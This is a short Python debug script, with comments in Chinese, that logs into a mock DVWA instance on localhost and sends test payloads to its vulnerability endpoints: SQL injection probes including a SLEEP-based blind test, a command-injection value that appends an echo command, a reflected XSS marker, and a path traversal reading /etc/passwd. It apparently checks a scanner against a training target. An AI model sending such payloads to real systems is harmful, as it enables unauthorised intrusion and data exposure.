import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
"""调试：手动访问 mock DVWA 各漏洞端点，验证返回内容"""
import logging
logging.basicConfig(level=logging.WARNING)
from http_client import HttpClient

c = HttpClient(timeout=15)
# 登录
c.login("http://127.0.0.1:8888/login.php", "admin", "password")
print("登录成功，cookies:", [ck.name for ck in c.session.cookies])

# 真实漏洞端点
tests = [
    ("报错注入", "http://127.0.0.1:8888/vulnerabilities/sqli/?id=1'"),
    ("时间盲注", "http://127.0.0.1:8888/vulnerabilities/sqli_blind/?id=1' AND SLEEP(2)-- -"),
    ("命令注入", "http://127.0.0.1:8888/vulnerabilities/exec/?ip=127.0.0.1;echo ABCDEFGHIJ12345"),
    ("XSS",     "http://127.0.0.1:8888/vulnerabilities/xss_r/?name=ABCDEFGHIJ12345"),
    ("LFI",     "http://127.0.0.1:8888/vulnerabilities/fi/?page=../../../../etc/passwd"),
]
import time
for name, url in tests:
    t0 = time.time()
    r = c.get(url)
    elapsed = time.time() - t0
    print(f"\n[{name}] {elapsed:.2f}s status={r.status_code}")
    print(f"  body: {r.text[:200]}")

